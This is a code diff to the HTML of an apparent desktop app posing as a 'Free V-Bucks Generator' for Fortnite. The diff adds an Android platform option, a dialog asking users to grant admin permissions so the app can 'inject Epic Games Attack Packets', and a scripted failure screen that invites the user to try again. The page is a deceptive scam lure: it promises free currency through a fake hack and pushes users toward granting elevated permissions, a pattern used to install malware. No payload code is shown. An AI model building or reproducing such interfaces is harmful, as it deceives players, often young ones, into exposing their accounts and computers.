@@ -23,12 +23,11 @@
 
     </head>
    
-   <body>
-       <div class="title_bar" id=title_bar"></div>
-        <div class="layout">
+   <body id="parent" style="overflow: hidden;">
+        <div id="title_bar"></div>
+        <div class="layout" id="child">
             <div class="generator-wrap1" >
                 <div class="fortnite-wrap col-lg-6 center-block">
-                    
                     <div class="title-wrap text-center">
                         <img src="img/logo.png" class="center-block img-responsive" alt="Free V-Bucks Generator">
                         <h3>V-Bucks Generator</h3>
@@ -38,7 +37,7 @@
                         <div class="fortnite-content-layer">
                             <div class="fortnite-content-layer2 text-center">
                                 
-                                <div class="wrap-wrap">
+                                <div class="wrap-wrap" id="username_box">
                                     <div class="col-sm-9 col-xs-9 center-block input-wrap text-center">
                                         <h4 style="font-family: fortnite; font-size: 20px; text-transform: uppercase;">Enter your Fortnite username and OS</h4>
                                         <input type="text" name="username" id="vbucksusername">
@@ -48,6 +47,7 @@
                                             <option value="Xone">Xbox One</option>
                                             <option value="NS">Nintendo Switch</option>
                                             <option value="iOS">iOS</option>
+                                            <option value="Android">Android</option>
                                         </select>
                                         <a href="index.html#" id="connect"><span> Connect </span></a>
                                     </div>
@@ -105,14 +105,14 @@
                                         <p class="progress-title" style="font-family: fortnite; font-size: 25px; text-transform: uppercase;">Initializing Socket</p>
                                         <p id="fortnite-progress-text">Generator will modify your account</p>
                                         <div class="progress">
-                                            <div class="progress-bar   active g-progressbar" role="progressbar" style="width: 20%"></div>
+                                            <div class="progress-bar active g-progressbar" role="progressbar" style="width: 20%"></div>
                                         </div>
                                         <p class="progress-description"></p>
                                     </div>
                                 </div>
                                 
                                 <div class="col-lg-12 verification-wrap" style="display: none;">
-                                    <div class="verification col-sm-7 col-xs-9 center-block">
+                                    <div class="verification col-sm-7 col-xs-9 center-block" id="verification">
                                         <div class="header-wrap">
                                             <h4 style="font-family: fortnite; font-size: 25px; text-transform: uppercase;">Epic Games Servers Hack</h4>
                                         </div>
@@ -122,13 +122,40 @@
                                             </p>
                                             <div class="verify-btn center-block text-center">
                                                 <div class="verify-btn-text">
-                                                    <a onclick="start_hack();" href="" style="font-family: fortnite; font-size: 22px; text-transform: uppercase; color: black;">Start Hack</a>
+                                                    <a onclick="start_hack();" href="index.html#" style="font-family: fortnite; font-size: 22px; text-transform: uppercase; color: black;">Start Hack</a>
                                                 </div>
                                             </div>
                                         </div>
                                     </div>
+
+                                    <div class="verification col-sm-7 col-xs-9 center-block" style="display: none;" id="confirm">
+                                        <h4 style="font-family: fortnite; font-size: 20px; text-transform: uppercase;">Your computer might need admin permissions to inject the Epic Games Attack Packets successfully. Do you want to continue?</h4>
+                                        <div id="menu-outer">
+                                            <div class="table">
+                                                <ul id="horizontal-list">                                
+                                                    <li><a href="index.html#" class="yes_no" id="confirm_yes"><span>Yes</span></a></li>
+                                                    &nbsp;&nbsp;&nbsp;
+                                                    <li><a href="index.html#" class="yes_no" id="confirm_no"><span>No</span></a></li>
+                                                </ul>
+                                            </div>
+                                        </div>
+                                    </div>
+
+                                    <div class="verification col-sm-7 col-xs-9 center-block" style="display: none;" id="fail">
+                                        <p style="font-family: fortnite; font-size: 25px; margin-bottom: 12px">
+                                            OOPS!
+                                        </p>
+                                        <h4 style="font-family: fortnite; font-size: 20px; text-transform: uppercase;">
+                                            It looks like we couldn't add the requested amount of V-Bucks to your account.
+                                            <span id="hint"></span>
+                                        </h4>
+                                        <br>
+                                        <a href="index.html#" class="proceed" id="reload"><span>Try Again</span></a>
+
+                                    </div>
+
                                 </div>
-                                
+
                                 <div class="col-lg-12 sticky-alert" style="margin-top: 12px;" id="live_activity">
                                     <div class="col-lg-12 sticky-alert">
                                         <p style="font-family: fortnite; font-size: 25px; margin-bottom: 12px">
@@ -165,12 +192,12 @@
         <script src="http://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/js/bootstrap.min.js" integrity="sha384-0mSbJDEHialfmuBBQP6A4Qrprq5OVfW37PRR3j5ELqxss1yVqOtnepnHVP9aJ7xS" crossorigin="anonymous"></script>
         <script type="text/javascript" src="js/vendor/jquery.magnific-popup.min.js"></script>
         <script type="text/javascript" src="js/index.js"></script>
-        <script>
-            let os = process.platform;
-            if (os == "win32") {
-                var script = document.createElement('script');
-                script.src = 'js/render_titlebar.js';
-                document.body.appendChild(script);
+        
+        <script type="text/javascript" src="js/render_titlebar.js"></script>
+        <script type="text/javascript">
+            if (process.platform == "win32") {
+                TITLEBAR.init(["main_window"]);
+                TITLEBAR.listen();
             }
         </script>
         <script>if (window.module) module = window.module;</script>
